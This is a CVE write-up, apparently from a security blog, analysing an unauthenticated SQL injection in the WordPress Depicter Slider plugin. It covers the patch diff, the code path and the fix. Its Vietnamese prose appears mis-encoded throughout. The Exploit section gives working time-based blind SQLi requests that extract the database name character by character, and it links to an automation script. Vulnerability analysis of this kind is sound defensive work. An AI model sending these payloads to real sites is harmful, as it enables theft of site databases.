---
title: CVE-2025-2011 
description: Security Vulnerability in WordPress Depicter Slider Plugin.
date: 2025-09-11 00:08:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, sqli]
---

## Introduction
L·ªó h·ªïng x·∫£y ra tr√™n plugin **Depicter Slider** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **3.6.2**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.
- **CVE ID**: [CVE-2025-2011](https://www.cve.org/CVERecord?id=CVE-2025-2011)
- **Product**: [WordPress Depicter Slider Plugin](https://wordpress.org/plugins/depicter/)
- **Vulnerability Type**: SQL Injection  
- **Affected Versions**: <= 3.6.1
- **CVSS severity**:  High (9.3)
- **Required Privilege**: Unauthenticated

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **Depicter Slider**:  v3.6.1(vul) v√† v3.6.2(fix)
- **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

## Analysis
Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ **GET** request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.

### Patch Diff
D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file **app/src/Controllers/Ajax/LeadsAjaxController.php**

`index`, `list`, `export` l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class `LeadsAjaxController` 

```php
public function index(RequestInterface $request, $view)
{
    $args = [
        's'         => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response   = \Depicter::lead()->get($args);
    $statusCode = isset($response['errors']) ? 400 : 200;

    return \Depicter::json($response)->withStatus($statusCode);
}
```
{: file="app/src/Controllers/Ajax/LeadsAjaxController.php v3.2" }

```php
public function list(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    return \Depicter::json($response);
}
```
{: file="app/src/Controllers/Ajax/LeadsAjaxController.php v3.2" }

```php
public function export(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    // other logic

    return \Depicter::json([
        'errors' => [__('error occurred during the export process', 'depicter')]
    ])->withStatus(400);
}
```
{: file="app/src/Controllers/Ajax/LeadsAjaxController.php v3.2" }

C·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng `Sanitize::sql` thay cho `Sanitize::textfield` nh·∫±m ƒë·∫£m b·∫£o param `'s'` ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL.

![patch diff](assets/img/posts/2025-09-11-CVE-2025-2011/patch_dif.png)

### How it work?

ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa `textfield` v√† `sql` ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a `function textfield`, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class `Sanitize`

> N·∫øu b·∫°n ƒë√£ c√†i **PHP Intelephense Extension** trong **vscode**, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> v√†o h√†m c·∫ßn ƒë·∫øn.
{: .prompt-tip }

![search 1](assets/img/posts/2025-09-11-CVE-2025-2011/search_1.png)

`textfield` tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c **sanitize** b·∫±ng `sanitize_text_field`, `sql` c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c **escape SQL**

```php
public static function sql( $input )
{
    return esc_sql( $input );
}
```
{: file="vendor/averta/wordpress/src/Utility/Sanitize.php v3.2" }

V√¨ ƒë√¢y l√† l·ªó h·ªïng **unauthenticated**, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt.

ƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ `index`, `list`, hay `export` l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class `LeadsAjaxController`. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n.

![search 2](assets/img/posts/2025-09-11-CVE-2025-2011/search_2.png)

üëâ `LeadsAjaxController` ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω **route Ajax**. Khi c√≥ request g·ª≠i t·ªõi endpoint `/wp-admin/admin-ajax.php?action=action_here&param1=param1_here&paramN=paramN_here`, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o `handle('LeadsAjaxController@function')` ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class `LeadsAjaxController`

C·∫£ ba h√†m ta ƒëang **focus** ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c **GET**, nh∆∞ng `export` l·∫°i c√≥ **middleware** x·ª≠ l√Ω `csrf-api`, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt `index` v√† `list`

Khi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m `index`, bi·∫øn `$response` ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ `\Depicter::lead()->get($args)`. Tuy nhi√™n, ph∆∞∆°ng th·ª©c `get()` l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn `\Depicter::leadRepository()->getResults($args)`, t·ª©c l√† c√πng m·ªôt logic m√† h√†m `list` ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m `list` l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh.

```php
public function list(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        'ids'              => Sanitize::textfield($request->query('ids', '')),
        'sources'          => Sanitize::textfield($request->query('sources', '')),
        'dateStart'        => Sanitize::textfield($request->query('dateStart', '')),
        'dateEnd'          => Sanitize::textfield($request->query('dateEnd', '')),
        'order'            => Sanitize::textfield($request->query('order', 'DESC')),
        'orderBy'          => Sanitize::textfield($request->query('orderBy', 'id')),
        'page'             => Sanitize::int($request->query('page', 1)),
        'perPage'          => Sanitize::int($request->query('perpage', 10)),
        'columns'          => Sanitize::textfield($request->query('columns', '')),
        'includeFields'    => Sanitize::textfield($request->query('includeFields', false)),
        'skipCustomFields' => Sanitize::textfield($request->query('skipCustomFields', false))
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    return \Depicter::json($response);
}
```
{: file="app/src/Controllers/Ajax/LeadsAjaxController.php v3.2" }

ƒê·ªÉ bi·∫øt `getResults` th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a `function getResults` ho·∫∑c <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> v√†o `getResults`

![search 3](assets/img/posts/2025-09-11-CVE-2025-2011/search_3.png)

üëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m `getResults`. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class `LeadRepository` v√† h√†m `leadRepository()`, nhi·ªÅu kh·∫£ nƒÉng `Depicter::leadRepository()` s·∫Ω tr·∫£ v·ªÅ m·ªôt **instance** c·ªßa class **LeadRepository**. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m **getResults** n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch.

Ta th·∫•y ƒëi·ªÅu ki·ªán `if`,khi kh√¥ng c√≥ param `includeFields` th√¨ `getLeadsResults` s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t `getLeadsResults` trong c√πng class:

```php
protected function getLeadsResults( $args ){
    // Purpose of joining tables is being able to search in leadField values as well
    $leadTable = $this->lead()->getTable();
    $leads = Lead::new()->select(
        "{$leadTable}.id",
        "{$leadTable}.source_id",
        "{$leadTable}.content_id",
        "{$leadTable}.content_name",
        "{$leadTable}.created_at",
        "lf.name as fieldName",
        "lf.value as fieldValue"
    )->join( "{$this->leadField()->getTable()} AS lf", "{$leadTable}.id", "=", "lf.lead_id" );

    // other logic

    if( ! empty( $args['s'] ) ){
        $search = "'%". $args['s'] ."%'";
        $leads->appendRawWhere('AND', "( lf.value like {$search} OR {$leadTable}.content_name like {$search} )");
    }

    $results = $this->paginate( $leads, $args );
}
```
{: file="app/src/Database/Repository/LeadRepository.php v3.2" }

Ta th·∫•y param `s`, n∆°i ƒë∆∞·ª£c b·∫£n v√° b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o c√¢u query b·∫±ng h√†m `appendRawWhere`. Khi ƒë√≥ 1 ph·∫ßn query t∆∞∆°ng ·ª©ng s·∫Ω l√†:

```sql
AND (lf.value like '%s_here%' OR leadtable.content_name like '%s_here%')
```

üëâ Nh∆∞ v·∫≠y khi g·ª≠i **GET request** ƒë·∫øn `/wp-admin/admin-ajax.php` v·ªõi params:

```
action=depicter-lead-index&s=payload_here
```

- `list` ƒë∆∞·ª£c g·ªçi v·ªõi duy nh·∫•t param `s` ƒë∆∞·ª£c th√™m v√†o `$args`, c√≤n l·∫°i ƒë∆∞·ª£c set gi√° tr·ªã m·∫∑c ƒë·ªãnh
- `getResults` ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë `$args`
- ƒêi·ªÅu ki·ªán `if( ! $args['includeFields'] )` trong `getResults` khi `includeFields` m·∫∑c ƒë·ªãnh l√† `false` => `getLeadsResults` ƒë∆∞·ª£c g·ªçi
- Th·ª±c hi·ªán truy v·∫•n g√¢y l·ªói SQLi

## Exploit 
### Detect SQLi

G·ª≠i **GET request** ch·ª©a payload SQLi.

```http
GET /wp-admin/admin-ajax.php?action=depicter-lead-list&s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Payload ƒë∆∞·ª£c decode:

```sql
999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- -
```

Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh 

```sql
AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #')
```

![response time](assets/img/posts/2025-09-11-CVE-2025-2011/resp_time.png)

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => payload ho·∫°t ƒë·ªông.

**Subquery trong m·ªánh ƒë·ªÅ FROM**: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. 

### Get First Letter of Database Name

ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ **dump ƒë∆∞·ª£c h·∫øt data** l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.

G·ª≠i request v·ªõi **SQLi payload**:

```http
GET /wp-admin/admin-ajax.php?action=depicter-lead-list&s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

S·ª≠ d·ª•ng `SUBSTRING()` ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa **database name**, `IF()` tr·∫£ v·ªÅ `SLEEP(5)` n·∫øu k√Ω t·ª± ƒë√≥ l√† `0x77`('w')

S·ª≠ d·ª•ng hex encoding `w` th√†nh `0x77` v√¨ `s` ƒë∆∞·ª£c l·∫•y t·ª´ **GET** request trong n√™n b·ªã escape b·ªüi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress v√† b·ªüi `sanitize_text_field`.

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† `w`.

D·ª±a tr√™n kƒ© thu·∫≠t **Timebased SQLi** ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.

[Script here](https://github.com/w41bu1/w41bu1.github.io/blob/main/assets/code/posts/2025-09-10-CVE-2025-30936/script.py)

## Conclusion
L·ªó h·ªïng **CVE-2025-2011** trong plugin WordPress **Depicter Slider** tr∆∞·ªõc phi√™n b·∫£n **3.6.2**, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

B·∫£n v√° ƒë√£ **escape SQL** khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi `'%...%'`

**Key takeaways**:

- Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.
- Lu√¥n s·ª≠ d·ª•ng `$wpdb->prepare()` khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.
- Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[ WordPress Depicter Slider Plugin <= 3.6.1 is vulnerable to SQL Injection ](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)